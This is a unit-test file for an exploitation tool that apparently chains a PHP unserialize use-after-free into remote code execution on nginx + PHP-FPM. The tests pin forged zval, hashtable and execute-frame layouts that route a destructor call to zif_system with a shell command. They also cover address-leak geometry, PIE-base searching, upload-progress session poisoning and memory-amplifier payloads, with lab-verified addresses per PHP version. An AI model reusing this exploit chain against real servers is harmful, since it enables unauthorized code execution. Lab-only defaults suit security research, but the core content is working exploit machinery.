#!/usr/bin/env python3
"""Unit tests for the nginx + PHP-FPM exploitation client (tools/php2shell_fpm.py).

The unit tests need no laboratory.  The integration tests at the bottom
need the local FPM lab (lab/fpm, ``tools/php2shell_fpm_labs.py up``) and
run only when PHP2SHELL_FPM_LAB=1 is set.
"""

from __future__ import annotations

import json
import os
import struct
import sys
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))

import php2shell_fpm as fpm  # noqa: E402
import php2shell_fpm_labs as labs  # noqa: E402
import php2shell_fpm_profile as profile_gen  # noqa: E402
import php2shell_fpm_versions as versions  # noqa: E402

D = 0x7F07BE280000      # lab-observed stale struct address
K = 0xFE8               # lab-observed reclaim content offset
SIZE = 12288
ZIF = 0x556C90186660    # lab-observed zif_system absolute address
CMD = b"id>out/p1"


class MultipartTests(unittest.TestCase):
    def test_build_multipart_shape(self):
        parts = [
            {"name": "pad0", "data": b"C" * 16},
            {"name": "f", "filename": "a.txt", "data": b"x" * 4},
        ]
        body = fpm.build_multipart(parts, b"BOUND1")
        self.assertTrue(body.startswith(b"--BOUND1\r\n"))
        self.assertIn(b'name="pad0"', body)
        self.assertIn(b'filename="a.txt"', body)
        self.assertIn(b"Content-Type: application/octet-stream", body)
        self.assertTrue(body.endswith(b"--BOUND1--\r\n"))


class LeakTests(unittest.TestCase):
    def test_dechunk(self):
        self.assertEqual(fpm._dechunk(b"4\r\nABCD\r\n0\r\n\r\n"), b"ABCD")
        self.assertEqual(fpm._dechunk(b"plain"), b"plain")

    def test_leak_geometry(self):
        # the offsets are per environment (calibrate derives them per host),
        # so only the invariants are asserted: the read spans both pointer
        # offsets and every offset is 8-byte aligned
        g = fpm._leak_geometry("8.4.26")
        self.assertIsNotNone(g)
        self.assertTrue(g["pads"])
        self.assertGreater(g["read_len"], g["chunk_ptr_off"])
        self.assertGreater(g["read_len"], g["pie_ptr_off"])
        self.assertEqual(g["chunk_ptr_off"] % 8, 0)
        self.assertEqual(g["pie_ptr_off"] % 8, 0)
        self.assertEqual(g["header_content_off"] % 8, 0)

    def test_leak_geometry_8425_pie_offset(self):
        # the profile was re-calibrated against this checkout's own build:
        # pins the shipped reference values, which is what the leak fallback
        # trusts when the target has no local calibration yet
        g = fpm._leak_geometry("8.4.25")
        self.assertIsNotNone(g)
        self.assertEqual(g["pie_base_off"], 0x4E80AA)
        self.assertEqual(g["pads"], [32768, 16384])


class NoOracleRemoteModeTests(unittest.TestCase):
    """--no-oracle must not silently read local /proc when remote."""

    def _args(self, **extra):
        base = dict(
            base="http://127.0.0.1:1",
            builder="http://127.0.0.1:2",
            version="8.4.26",
            chunk=0,
            pie=0,
            allow_local_fallback=False,
        )
        base.update(extra)
        return SimpleNamespace(**base)

    def test_http_leak_failure_does_not_use_local_fallback(self):
        with mock.patch.object(fpm, "leak_bases_http",
                               side_effect=RuntimeError("offline")), \
             mock.patch.object(fpm, "_local_bases") as local:
            self.assertEqual(fpm.cmd_no_oracle(self._args()), 1)
            local.assert_not_called()

    def test_local_fallback_requires_explicit_opt_in(self):
        with mock.patch.object(fpm, "leak_bases_http",
                               side_effect=RuntimeError("offline")), \
             mock.patch.object(fpm, "_local_bases",
                               side_effect=RuntimeError("no lab")) as local:
            self.assertEqual(
                fpm.cmd_no_oracle(self._args(allow_local_fallback=True)), 1)
            local.assert_called_once_with("8.4.26")


class DispatcherDryRunTests(unittest.TestCase):
    """--dry-run must not start the FPM chain."""

    def test_dry_run_does_not_call_endgame(self):
        import php2shell_auto as auto

        args = SimpleNamespace(
            target="http://127.0.0.1:8110/index.php", builder=None,
            command="id>/out/p1", proof_file=None, dry_run=True,
            allow_remote=False)
        ui = SimpleNamespace(
            stage=lambda *a, **k: None, info=lambda *a, **k: None,
            command=lambda *a, **k: None, crit=lambda *a, **k: None,
            result=lambda *a, **k: None)
        with mock.patch.object(fpm, "cmd_endgame") as endgame:
            self.assertEqual(auto.run_fpm_chain(ui, args, "8.4.26"), 0)
            endgame.assert_not_called()


class RemoteAuthorizationTests(unittest.TestCase):
    """Remote targets are opt-in, matching the Apache dispatcher."""

    def test_loopback_is_allowed(self):
        self.assertTrue(fpm.remote_targets_allowed(
            "http://127.0.0.1:8110", "http://localhost:8111", False))

    def test_remote_is_refused_by_default(self):
        self.assertFalse(fpm.remote_targets_allowed(
            "http://192.0.2.10", None, False))
        self.assertFalse(fpm.remote_targets_allowed(
            "http://127.0.0.1:8110", "http://192.0.2.11", False))

    def test_explicit_opt_in_is_honoured(self):
        self.assertTrue(fpm.remote_targets_allowed(
            "http://192.0.2.10", None, True))


class EndgamePayloadTests(unittest.TestCase):
    """The forged buffer must encode the exact dtor-chain layout the
    8.4.26 source expects (var_unserializer.re, session.c, zend_hash.c)."""

    @classmethod
    def setUpClass(cls):
        cls.buf = fpm._build_endgame_payload(D, K, SIZE, ZIF, CMD)

    def _off(self, addr: int) -> int:
        return K + (addr - D)

    def _u64(self, addr: int) -> int:
        return struct.unpack_from("<Q", self.buf, self._off(addr))[0]

    def _u32(self, addr: int) -> int:
        return struct.unpack_from("<I", self.buf, self._off(addr))[0]

    def _i64(self, addr: int) -> int:
        return struct.unpack_from("<q", self.buf, self._off(addr))[0]

    def test_fits_reclaim_buffer(self):
        self.assertLessEqual(K + 0x900, SIZE)

    def test_decode_struct(self):
        # last points at the embedded entries; used_slots=2 pushes new
        # values to data[2..] leaving data[1] for R:2 (var_access(1))
        self.assertEqual(self._u64(D + 0), D + 56)
        self.assertEqual(self._u64(D + 8), D + 0x400)
        self.assertEqual(self._u64(D + 16), D + 0x400)
        self.assertEqual(self._i64(D + 48), 64)
        self.assertEqual(self._i64(D + 56), 2)
        self.assertEqual(self._u64(D + 80), D + 0x300)
        self.assertEqual(self._i64(D + 0x400), 0)

    def test_fake_zval_is_reference(self):
        self.assertEqual(self._u64(D + 0x300), D + 0x500)
        self.assertEqual(self._u32(D + 0x308), 0x10A)  # IS_REFERENCE_EX

    def test_fake_reference(self):
        self.assertEqual(self._u32(D + 0x500), 0)      # rc forged 0
        self.assertEqual(self._u32(D + 0x504), 10)     # IS_REFERENCE
        self.assertEqual(self._u64(D + 0x508), D + 0x700)
        self.assertEqual(self._u32(D + 0x510), 0x307)  # IS_ARRAY_EX
        self.assertEqual(self._u64(D + 0x518), 0)      # sources = NULL

    def test_fake_hashtable(self):
        self.assertEqual(self._u32(D + 0x700), 1)      # rc 1
        self.assertEqual(self._u32(D + 0x704), 7)      # IS_ARRAY
        self.assertEqual(self._u32(D + 0x708), 0x10)   # HASH_FLAG_STATIC_KEYS
        self.assertEqual(self._u32(D + 0x70C), 0xFFFFFFF8)
        self.assertEqual(self._u64(D + 0x710), D + 0x800)
        self.assertEqual(self._u32(D + 0x718), 1)      # nNumUsed
        self.assertEqual(self._u32(D + 0x71C), 1)      # nNumOfElements
        self.assertEqual(self._u32(D + 0x720), 8)      # nTableSize
        self.assertEqual(self._u64(D + 0x730), ZIF)    # pDestructor

    def test_execute_frame(self):
        # the bucket at E doubles as the zif_system execute_data frame
        self.assertEqual(self._u64(D + 0x800), D + 0x880)  # val.str / opline
        self.assertEqual(self._u32(D + 0x808), 6)          # IS_STRING (non-UNDEF)
        self.assertEqual(self._u64(D + 0x810), D + 0x8F0)  # return_value scratch
        self.assertEqual(struct.unpack_from("<H", self.buf, self._off(D + 0x82C))[0], 1)
        self.assertEqual(self._u64(D + 0x850), D + 0x880)  # arg1.str
        self.assertEqual(self._u32(D + 0x858), 0x106)      # arg1 IS_STRING_EX

    def test_fake_zend_string(self):
        self.assertEqual(self._u32(D + 0x880), 1)          # gc.refcount
        self.assertEqual(self._u32(D + 0x884), 6)          # IS_STRING
        self.assertEqual(self._u64(D + 0x890), len(CMD))
        val = self.buf[self._off(D + 0x898):self._off(D + 0x898) + len(CMD)]
        self.assertEqual(val, CMD)
        self.assertEqual(self.buf[self._off(D + 0x898) + len(CMD)], 0)


class ProfileGeneratorTests(unittest.TestCase):
    NM = ("0000000000386460 t zif_system\n"
          "0000000000549890 T zval_ptr_dtor\n"
          "0000000000a04660 B basic_globals\n")

    def test_parse_nm_symbols(self):
        symbols = profile_gen.parse_nm(self.NM)
        self.assertEqual(symbols, {
            "zif_system": 0x386460,
            "zval_ptr_dtor": 0x549890,
            "basic_globals": 0xA04660,
        })

    def test_parse_nm_rejects_missing_symbol(self):
        with self.assertRaisesRegex(ValueError, "missing symbols"):
            profile_gen.parse_nm("0000000000386460 t zif_system\n")

    def test_build_draft_copies_geometry_and_marks_unverified(self):
        template = json.loads(
            (ROOT / "profiles" / "8.4.26-fpm.json").read_text())
        draft = profile_gen.build_draft("8.4.25",
                                        profile_gen.parse_nm(self.NM), template)
        self.assertFalse(draft["verified"])
        self.assertFalse(draft["rce"])
        self.assertEqual(draft["fixed_in"], "8.4.27")
        self.assertEqual(draft["libphp"]["zif_system"], "0x386460")
        self.assertEqual(draft["fpm"]["basic_globals"], "0xa04660")
        self.assertEqual(draft["fpm"]["leak"], template["fpm"]["leak"])


class PathConfigTests(unittest.TestCase):
    def test_cookie_name_and_custom_paths(self):
        args = SimpleNamespace(app_path="/index.php", arm_path="/arm.php",
                               ref_path="/session.php", probe_path="/404",
                               session_cookie="MYSESSID")
        with mock.patch.dict(fpm.PATHS, {
                "app": "/app.php", "arm": "/bigvar.php", "ref": "/ref.php",
                "probe": "/nope.php", "cookie": "PHPSESSID"}):
            fpm.configure_paths(args)
            self.assertEqual(fpm.PATHS["app"], "/index.php")
            self.assertEqual(fpm.PATHS["cookie"], "MYSESSID")
            self.assertEqual(fpm._cookie(b"abc"), b"MYSESSID=abc")


class OracleChunkTests(unittest.TestCase):
    def test_chunk_base_handles_merged_anonymous_mapping(self):
        oracle = object.__new__(fpm.Oracle)
        oracle.maps = [(0x7F0000000000, 0x7F0000230000, "rw-p")]
        self.assertEqual(oracle.chunk_base(0x7F0000081000), 0x7F0000000000)


class ProfileConsistencyTests(unittest.TestCase):
    def _profile(self, version: str = "8.4.26") -> dict:
        return json.loads((ROOT / "profiles" / f"{version}-fpm.json").read_text())

    def test_fpm_profile_matches_module_constants(self):
        meta = self._profile()["fpm"]
        self.assertEqual(meta["bg_unserialize_data_off"],
                         fpm.BG_UNSERIALIZE_DATA_OFF)
        self.assertEqual(meta["bg_unserialize_level_off"],
                         fpm.BG_UNSERIALIZE_LEVEL_OFF)
        self.assertEqual(meta["struct_size"], 8216)
        # reclaim shape is per environment: what matters is that the reader
        # gets back exactly what the profile records
        size, candidates, pads = fpm._no_oracle_geometry("8.4.26")
        self.assertEqual(meta["no_oracle"]["reclaim_size"], size)
        self.assertTrue(candidates)
        for _d_off, k in candidates:
            self.assertEqual(k % 8, 0)

    def test_fpm_profile_is_rce_verified(self):
        profile = self._profile()
        self.assertEqual(profile["sapi"], "fpm")
        self.assertTrue(profile["rce"])
        self.assertTrue(profile["verified"])
        self.assertEqual(profile["fixed_in"], "8.4.27")
        self.assertEqual(profile["libphp"]["zif_system"], "0x386660")

    def test_fpm_8425_profile_is_rce_verified(self):
        profile = self._profile("8.4.25")
        self.assertTrue(profile["rce"])
        self.assertTrue(profile["verified"])
        self.assertEqual(profile["fixed_in"], "8.4.27")
        self.assertEqual(profile["libphp"]["zif_system"], "0x386460")
        self.assertEqual(profile["fpm"]["reclaim_pads"], [4096, 4096, 4096])
        self.assertEqual(profile["fpm"]["no_oracle"]["candidates"],
                         [{"d_off": "0x81000", "k": "0xfe8"}])

    def test_fpm_profile_validates_against_schema(self):
        try:
            import jsonschema
        except ImportError:
            self.skipTest("jsonschema not installed")
        schema = json.loads((ROOT / "profiles" / "fpm-schema.json").read_text())
        for version in ("7.4.33", "8.0.30", "8.1.33",
                        "8.2.34", "8.3.35", "8.4.0", "8.4.25", "8.4.26"):
            with self.subTest(version=version):
                jsonschema.validate(self._profile(version), schema)


LAB = os.environ.get("PHP2SHELL_FPM_LAB") == "1"
LAB_VERSION = os.environ.get("PHP2SHELL_FPM_VERSION", "8.4.26")
LAB_PORTS = {version: (ports[0], ports[1])
             for version, ports in labs.builds_map().items()}


@unittest.skipUnless(LAB, "set PHP2SHELL_FPM_LAB=1 with the FPM lab up")
class FpmLabIntegrationTests(unittest.TestCase):
    """End-to-end primitive and RCE against a local FPM lab."""

    def _args(self, **extra):
        chain, builder = LAB_PORTS[LAB_VERSION]
        proof = f"out/p1lab-{LAB_VERSION.replace('.', '')}"
        base = dict(
            base=f"http://127.0.0.1:{chain}",
            builder=f"http://127.0.0.1:{builder}",
            version=LAB_VERSION,
            size=4 << 20,
            value=1337337,
            command=f"id>{proof}",
            proof_file=proof,
        )
        base.update(extra)
        return SimpleNamespace(**base)

    def test_primitive_observable(self):
        self.assertEqual(fpm.cmd_primitive(self._args()), 0)

    def test_endgame_rce_proof(self):
        self.assertEqual(fpm.cmd_endgame(self._args()), 0)

    def test_no_oracle_rce_proof(self):
        self.assertEqual(fpm.cmd_no_oracle(self._args()), 0)


@unittest.skipUnless(LAB, "set PHP2SHELL_FPM_LAB=1 with the FPM lab up")
class FpmLabPoisonTests(unittest.TestCase):
    """The session-file plant against a live build, over HTTP only.

    The plant works on every version with session.upload_progress; the
    branches the RCE chain does not cover (5.x, 7.2) are verified with it,
    and it is re-checked here on a chain build as well.
    """

    def test_session_file_plant(self):
        chain, builder = LAB_PORTS[LAB_VERSION]
        sid = ("cilab" + LAB_VERSION.replace(".", ""))[:20]
        args = SimpleNamespace(
            base=f"http://127.0.0.1:{chain}",
            builder=f"http://127.0.0.1:{builder}",
            version=LAB_VERSION,
            sid=sid,
            payload="PLANTED_BY_CI",
            progress_key=None)
        self.assertEqual(fpm.cmd_poison(args), 0)


class VersionRegistryTests(unittest.TestCase):
    """The advisory matrix (CVE-2026-109619) has to drive every tool."""

    def test_patched_branch_boundary(self):
        self.assertTrue(versions.is_vulnerable("8.4.26"))
        self.assertFalse(versions.is_vulnerable("8.4.27"))
        self.assertTrue(versions.is_vulnerable("8.2.34"))
        self.assertFalse(versions.is_vulnerable("8.2.35"))
        self.assertTrue(versions.is_vulnerable("8.3.35"))
        self.assertFalse(versions.is_vulnerable("8.3.36"))

    def test_eol_branches_are_always_vulnerable(self):
        for version in ("7.2.34", "7.4.33", "8.0.30", "8.1.33"):
            with self.subTest(version=version):
                self.assertTrue(versions.is_vulnerable(version))
                self.assertIsNone(versions.fixed_in(version))

    def test_chain_applies_from_php_74(self):
        """The stale BG(unserialize) struct is reclaimed from 7.4 on.

        php_var_unserialize_init reuses it whenever level > 0, the Zend
        memory manager frees the emalloc block at request end, and
        php_session_cancel_decode (8.2+) only unlinks the session file.
        Verified end to end (RCE over HTTP) on 7.4.33, 8.0.30 and 8.1.33.
        7.2 arms the stale state but no reclaim shape covers its struct
        yet, so it keeps the session-file plant (5.x likewise, having no
        zend_reference to forge).
        """
        self.assertFalse(versions.chain_applies("7.2.34"))
        self.assertTrue(versions.chain_applies("7.4.33"))
        self.assertTrue(versions.chain_applies("8.0.0"))
        self.assertTrue(versions.chain_applies("8.1.33"))
        self.assertTrue(versions.chain_applies("8.4.26"))

    def test_cancel_decode_detection_reads_the_source(self):
        source = ROOT / "lab" / "fpm" / "runtime" / "src"
        expected = {"php-7.2.34": False, "php-7.4.33": False,
                    "php-8.2.34": True, "php-8.4.26": True}
        for name, want in expected.items():
            tree = source / name
            if not tree.is_dir():
                self.skipTest(f"{tree} is not extracted")
            with self.subTest(build=name):
                self.assertEqual(versions.has_session_cancel_decode(str(tree)),
                                 want)

    def test_fixed_in_per_branch(self):
        self.assertEqual(versions.fixed_in("8.4.26"), "8.4.27")
        self.assertEqual(versions.fixed_in("8.3.1"), "8.3.36")
        self.assertIsNone(versions.fixed_in("7.2.1"))

    def test_affected_versions_cover_every_branch(self):
        affected = versions.affected_versions()
        for version in ("8.2.34", "8.3.35", "8.4.26", "7.2.34", "7.4.33"):
            self.assertIn(version, affected)

    def test_ports_keep_documented_builds_and_never_collide(self):
        self.assertEqual(versions.ports_for("8.4.26"), (8110, 8111, 9001, 9002))
        self.assertEqual(versions.ports_for("8.4.25"), (8130, 8131, 9021, 9022))
        used: dict[int, str] = {}
        for version in ("7.2.34", "7.4.33", "8.2.34", "8.3.35",
                        "8.4.25", "8.4.26", "8.4.27"):
            for port in versions.ports_for(version):
                self.assertNotIn(port, used, f"{version} reuses {port} "
                                             f"from {used.get(port)}")
                used[port] = version

    def test_unknown_branch_is_rejected(self):
        with self.assertRaises(versions.UnknownVersion):
            versions.ports_for("9.9.9")

    def test_source_detection_uses_the_fix_marker(self):
        source = ROOT / "lab" / "fpm" / "runtime" / "src"
        fixed = source / "php-8.4.27.tar.gz"
        vulnerable = source / "php-8.4.26.tar.gz"
        if not (fixed.is_file() and vulnerable.is_file()):
            self.skipTest("release tarballs are not downloaded")
        self.assertTrue(versions.source_is_fixed(str(fixed)))
        self.assertFalse(versions.source_is_fixed(str(vulnerable)))


MODERN_SOURCE = """\
#define VAR_ENTRIES_MAX 1018
struct php_unserialize_data {
\tvar_entries      *last;
\tvar_dtor_entries *first_dtor;
\tvar_dtor_entries *last_dtor;
\tHashTable        *allowed_classes;
\tHashTable        *ref_props;
\tzend_long         cur_depth;
\tzend_long         max_depth;
\tvar_entries       entries;
};
"""


class UnserializeLayoutTests(unittest.TestCase):
    """The struct shape decides which payload has to be forged."""

    def _parse(self, text: str) -> dict:
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "ext", "standard")
            os.makedirs(path)
            with open(os.path.join(path, "var_unserializer.c"),
                      "w", encoding="utf-8") as handle:
                handle.write(text)
            return profile_gen.parse_unserialize_struct(tmp)

    def test_modern_shape_has_embedded_block(self):
        parsed = self._parse(MODERN_SOURCE)
        self.assertEqual(parsed["offsets"]["entries"], 56)
        self.assertEqual(parsed["size"], 56 + 16 + 8 * 1018)
        self.assertEqual(parsed["var_entries"]["data"], 16)
        self.assertEqual(parsed["var_entries"]["used_slots"], 0)


class PoisonTests(unittest.TestCase):
    """Upload-progress session-ID fixation (the chain that works on 7.x)."""

    def _args(self, **extra):
        base = dict(base="http://127.0.0.1:1", builder="http://127.0.0.1:2",
                    version="7.4.33", sid="fixedsid01", payload="MARKER",
                    progress_key=None)
        base.update(extra)
        return SimpleNamespace(**base)

    def test_sid_comes_from_the_post_body_and_payload_is_the_filename(self):
        captured = {}

        def fake_post(parts, boundary, timeout=None):
            captured["parts"] = parts
            return 200, {}, b""

        with mock.patch.object(fpm, "Target") as target_cls, \
             mock.patch.object(os.path, "isfile", return_value=False), \
             mock.patch.object(fpm.os.path, "isfile", return_value=False):
            target_cls.side_effect = lambda *a, **k: mock.Mock(
                post_multipart=fake_post, get=lambda *a, **k: (200, {}, b""))
            self.assertEqual(fpm.cmd_poison(self._args()), 1)

        names = [part["name"] for part in captured["parts"]]
        self.assertIn("PHPSESSID", names)          # POST-body sid fixation
        self.assertIn("PHP_SESSION_UPLOAD_PROGRESS", names)
        file_part = next(p for p in captured["parts"]
                         if p.get("filename") is not None)
        self.assertEqual(file_part["filename"], b"MARKER")

    def test_verified_when_the_application_reflects_the_payload(self):
        def post(*_args, **_kwargs):
            return 200, {}, b""

        def get(*_args, **_kwargs):
            return 200, {}, b"upload_progress_pwn|a:1:{s:4:\"name\";s:6:\"MARKER\";}"

        with mock.patch.object(fpm, "Target") as target_cls, \
             mock.patch.object(fpm.os.path, "isfile", return_value=False):
            target_cls.side_effect = lambda *a, **k: mock.Mock(
                post_multipart=post, get=get)
            self.assertEqual(fpm.cmd_poison(self._args()), 0)

if __name__ == "__main__":
    unittest.main()


class PieCodeWindowTests(unittest.TestCase):
    """The executable window bounds the PIE-base search: the real pointer is
    tried at the step that reproduces its offset, and every pointer costs at
    most a handful of endgame attempts."""

    WINDOW = (0x200000, 0x600000)

    def _steps(self, pointer: int) -> list[tuple[int, int]]:
        """(step, offset) pairs the window would actually try."""
        aligned = pointer & ~(fpm.MEM_CHUNK - 1)
        out = []
        for steps in range(0, 6):
            candidate = aligned - steps * fpm.MEM_CHUNK
            offset = pointer - candidate
            if offset >= self.WINDOW[1]:
                break
            if offset < self.WINDOW[0]:
                continue
            out.append((steps, offset))
        return out

    def test_real_handler_pointer_is_tried_at_its_true_base(self):
        pie = 0x557099000000            # lab-observed 8.4.26 base
        pointer = pie + 0x4EA787        # execute_ex handler table
        tried = self._steps(pointer)
        self.assertIn((2, 0x4EA787), tried)
        # the step that carries the true base is among the candidates
        self.assertTrue(any(pointer - (pointer & ~(fpm.MEM_CHUNK - 1))
                            + step * fpm.MEM_CHUNK == 0x4EA787
                            for step, _offset in tried))

    def test_search_is_bounded_per_pointer(self):
        for pointer in (0x5570994EA787, 0x560EECEB6E20, 0x7F784BC8B000):
            with self.subTest(pointer=hex(pointer)):
                self.assertLessEqual(len(self._steps(pointer)), 4)

    def test_window_constant_matches_the_shipped_geometry(self):
        self.assertEqual(fpm.PIE_CODE_WINDOW, self.WINDOW)


class DefaultModeTests(unittest.TestCase):
    """Single-origin, amplifier-arm and worker-fanout behaviour.

    These are the pieces that let the chain run against a stock
    installation: one port (builder prefix), --arm-mode auto picking the
    growth/amplifier arm when both URLs share an origin, a decode-side
    amplifier payload instead of a two-pool memory split, and a consume
    fan-out sized like a default pm=dynamic pool.
    """

    def setUp(self):
        self._saved = (
            fpm.ARM_MODE, fpm.BUILDER_PREFIX, fpm.WORKERS,
            dict(fpm.PATHS), fpm._probe_usable, fpm._amplifier_usable,
            dict(fpm._amplifier_cache),
        )

    def tearDown(self):
        (fpm.ARM_MODE, fpm.BUILDER_PREFIX, fpm.WORKERS, paths,
         fpm._probe_usable, fpm._amplifier_usable, cache) = (
            *self._saved[:3], self._saved[3], self._saved[4],
            self._saved[5], self._saved[6])
        fpm.PATHS.clear()
        fpm.PATHS.update(paths)
        fpm._amplifier_cache.clear()
        fpm._amplifier_cache.update(cache)

    @staticmethod
    def _args(**extra):
        base = dict(
            base="http://t:8080", builder=None, builder_prefix="",
            arm_mode="auto", workers=5, grow_chunk=0, grow_max=0,
            arm_body=0, app_path=None, arm_path=None, ref_path=None,
            probe_path=None, grow_path=None, session_cookie=None,
        )
        base.update(extra)
        return SimpleNamespace(**base)

    def test_auto_same_origin_selects_growth(self):
        fpm.configure_paths(self._args())
        self.assertEqual(fpm.ARM_MODE, "growth")

    def test_auto_two_origins_selects_builder(self):
        fpm.configure_paths(self._args(builder="http://t:8081"))
        self.assertEqual(fpm.ARM_MODE, "builder")

    def test_auto_with_builder_prefix_selects_builder(self):
        fpm.configure_paths(self._args(builder_prefix="/b"))
        self.assertEqual(fpm.ARM_MODE, "builder")

    def test_explicit_arm_mode_wins(self):
        fpm.configure_paths(self._args(arm_mode="builder"))
        self.assertEqual(fpm.ARM_MODE, "builder")

    def test_cli_default_fans_out_over_five_workers(self):
        fpm.configure_paths(self._args())
        self.assertEqual(fpm.WORKERS, 5)

    def test_missing_workers_falls_back_to_one(self):
        args = self._args()
        del args.workers
        fpm.configure_paths(args)
        self.assertEqual(fpm.WORKERS, 1)

    def test_builder_target_applies_prefix_chain_does_not(self):
        fpm.configure_paths(self._args(builder_prefix="/b"))
        builder = fpm.builder_target("http://t:8080")
        self.assertEqual(builder._p(builder.path), "/b/")
        self.assertEqual(builder._p("/bigvar.php"), "/b/bigvar.php")
        chain = fpm.Target("http://t:8080")
        self.assertEqual(chain._p("/bigvar.php"), "/bigvar.php")

    def test_post_raw_sends_braces_unencoded(self):
        captured = {}

        def fake_exch(req, read_cap=1 << 22, timeout=None):
            captured["req"] = req
            return 200, {}, b"GROW_OK 0 B0"

        with mock.patch.object(fpm.Target, "_exch", side_effect=fake_exch):
            target = fpm.Target("http://t:8080")
            target.post_raw("/grow.php", b"p=a:1:{i:0;N;}")
        req = captured["req"]
        self.assertIn(b"p=a:1:{i:0;N;}", req)
        self.assertNotIn(b"%7B", req)

    def test_amplifier_payload_shape(self):
        payload = fpm._amplifier_payload(8200000)
        # short strings first: the leak's R:2 hook reads data[1]
        self.assertTrue(payload.startswith(b'a|s:2000:"'))
        self.assertGreater(payload.count(b'|s:2000:"'), 1)
        # exactly one array key, no doubled "k|" prefix
        self.assertEqual(payload.count(b"k|a:"), 1)
        # non-empty nested children (PHP interns a:0:{}, they would be free)
        self.assertIn(b"a:1:{i:0;a:1:{i:0;N;}}", payload)
        self.assertLessEqual(len(payload), 8200000 + 64)

    def test_amplifier_payload_is_cached(self):
        first = fpm._amplifier_payload(100000)
        self.assertIs(first, fpm._amplifier_payload(100000))

    def test_grow_size_parses_only_the_session_bytes(self):
        self.assertEqual(fpm._grow_size(b"GROW_OK 60751872 B8200000 UL1"),
                         60751872)

    def test_amplifier_arm_detects_oom(self):
        target = fpm.Target("http://t:8080")
        with mock.patch.object(target, "post_raw",
                               return_value=(200, {}, b"")) as post:
            self.assertIs(fpm._amplifier_arm(target, b"sid"), True)
            self.assertEqual(post.call_count, 1)

    def test_amplifier_arm_skips_413_and_caches_usable_body(self):
        target = fpm.Target("http://t:8080")

        def responder(path, body, cookie=None, timeout=None):
            size = len(body) - 2     # "p="
            if size > 3000000:
                return 413, {}, b""
            # full body arrived, decode survived
            return 200, {}, b"GROW_OK 0 B%d" % size

        with mock.patch.object(target, "post_raw", side_effect=responder):
            self.assertIsNone(fpm._amplifier_arm(target, b"sid"))
        self.assertEqual(fpm._amplifier_usable, 3000000)
        # second call goes straight at the cached size
        with mock.patch.object(target, "post_raw",
                               side_effect=responder) as post:
            fpm._amplifier_arm(target, b"sid")
            self.assertEqual(post.call_count, 1)

    def test_amplifier_arm_reports_discarded_bodies_as_false(self):
        target = fpm.Target("http://t:8080")

        def responder(path, body, cookie=None, timeout=None):
            # post_max_size below every ladder rung: body never arrives
            return 200, {}, b"GROW_OK 0 B0"

        with mock.patch.object(target, "post_raw", side_effect=responder):
            self.assertIs(fpm._amplifier_arm(target, b"sid"), False)

    def test_growth_mode_reads_growth_geometry(self):
        # 8.4.26 ships the classic two-surface geometry; when the profile
        # carries a fpm.growth section (default-install calibration) growth
        # mode prefers it, otherwise it falls back to the classic one
        fpm.configure_paths(self._args())          # auto -> growth
        leak = fpm._leak_geometry("8.4.26")
        self.assertGreater(leak["read_len"], leak["chunk_ptr_off"])
        size, candidates, pads = fpm._no_oracle_geometry("8.4.26")
        self.assertTrue(candidates)
        self.assertTrue(pads)

    def test_builder_mode_keeps_classic_geometry(self):
        fpm.configure_paths(self._args(arm_mode="builder"))
        leak = fpm._leak_geometry("8.4.26")
        self.assertGreater(leak["read_len"], leak["pie_ptr_off"])
        size, candidates, pads = fpm._no_oracle_geometry("8.4.26")
        self.assertTrue(candidates)
        self.assertTrue(pads)
